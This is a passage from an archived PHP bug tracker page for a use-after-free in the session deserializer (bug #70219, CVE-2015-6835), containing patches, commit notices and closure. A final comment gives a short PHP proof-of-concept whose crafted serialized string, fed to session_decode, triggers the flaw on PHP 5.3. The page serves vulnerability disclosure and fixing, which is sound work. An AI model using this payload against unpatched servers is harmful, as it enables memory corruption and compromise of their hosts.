+-	php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC);
++	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC)) {
++		var_push_dtor(&amp;var_hash, &amp;session_vars);
++	}	
+ 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+ 	if (PS(http_session_vars)) {
+ 		zval_ptr_dtor(&amp;PS(http_session_vars));
+@@ -871,7 +873,9 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 		array_init(session_vars);
+ 	}
+ 	PS(http_session_vars) = session_vars;
+-	ZEND_SET_GLOBAL_VAR_WITH_LENGTH(&quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), PS(http_session_vars), 2, 1);
++	Z_SET_ISREF_TO_P(PS(http_session_vars), 1);
++	Z_ADDREF_P(PS(http_session_vars));
++	zend_hash_update(&amp;EG(symbol_table), &quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), &amp;PS(http_session_vars), sizeof(zval *), NULL);
+ 	return SUCCESS;
+ }
+ /* }}} */
+</pre>
+</div><div class='comment type_comment' ><a name="1440697999">&nbsp;</a><strong>[2015-08-27 17:53 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
+<pre class='note'>patch for 5.5 and 5.6:
+
+diff --git a/php-5.6.12/session.c b/php-5.6.12-fixed/session.c
+index b73d5ed..c4f8b72 100644
+--- a/php-5.6.12/session.c
++++ b/php-5.6.12-fixed/session.c
+@@ -862,7 +862,9 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 
+ 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+ 	ALLOC_INIT_ZVAL(session_vars);
+-	php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC);
++	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC)) {
++		var_push_dtor(&amp;var_hash, &amp;session_vars);
++	}	
+ 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+ 	if (PS(http_session_vars)) {
+ 		zval_ptr_dtor(&amp;PS(http_session_vars));
+@@ -871,7 +873,7 @@ PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
+ 		array_init(session_vars);
+ 	}
+ 	PS(http_session_vars) = session_vars;
+-	ZEND_SET_GLOBAL_VAR_WITH_LENGTH(&quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), PS(http_session_vars), 2, 1);
++	ZEND_SET_GLOBAL_VAR_WITH_LENGTH(&quot;_SESSION&quot;, sizeof(&quot;_SESSION&quot;), PS(http_session_vars), Z_REFCOUNT_P(PS(http_session_vars)) + 1, 1);
+ 	return SUCCESS;
+ }
+ /* }}} */
+</pre>
+</div><div class='comment type_comment' ><a name="1440823866">&nbsp;</a><strong>[2015-08-29 04:51 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>ok, I added the latest patch to 5.5 branch
+</pre>
+</div><div class='comment type_svn' ><a name="1441133732">&nbsp;</a><strong>[2015-09-01 18:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5</a>
+Log: Fix <a href='bug.php?id=70219'>bug #70219</a> (Use after free vulnerability in session deserializer)
+</pre>
+</div><div class='comment type_log' ><a name="1441133732">&nbsp;</a><strong>[2015-09-01 18:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1441134277">&nbsp;</a><strong>[2015-09-01 19:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5</a>
+Log: Fix <a href='bug.php?id=70219'>bug #70219</a> (Use after free vulnerability in session deserializer)
+</pre>
+</div><div class='comment type_svn' ><a name="1441134428">&nbsp;</a><strong>[2015-09-01 19:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5</a>
+Log: Fix <a href='bug.php?id=70219'>bug #70219</a> (Use after free vulnerability in session deserializer)
+</pre>
+</div><div class='comment type_svn' ><a name="1441182549">&nbsp;</a><strong>[2015-09-02 08:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5</a>
+Log: Fix <a href='bug.php?id=70219'>bug #70219</a> (Use after free vulnerability in session deserializer)
+</pre>
+</div><div class='comment type_svn' ><a name="1441303838">&nbsp;</a><strong>[2015-09-03 18:10 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=df4bf28f9f104ca3ef78ed94b497859f15b004e5</a>
+Log: Fix <a href='bug.php?id=70219'>bug #70219</a> (Use after free vulnerability in session deserializer)
+</pre>
+</div><div class='comment type_log' ><a name="1441793325">&nbsp;</a><strong>[2015-09-09 10:08 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID:      2015-6835</span>
+</div></div></div><div class='comment type_comment' ><a name="1466520244">&nbsp;</a><strong>[2016-06-21 14:44 UTC] paul &#x64;&#111;&#x74; kelly &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Hi There,
+
+The following code run on php 5.3.x also works:
+
+session_start();
+
+$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';
+session_decode($exploit);
+
+for ($i = 0; $i &lt; 5; $i++) {
+    $v[$i] = 'hi'.$i;
+}
+
+var_dump($_SESSION);
+
+Unfortunately because php.net didn't specify that this affected 5.3 vendors like Redhat have not back ported the patch.
+
+Can you re-open this and explicitly state this?
+
+Paul
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
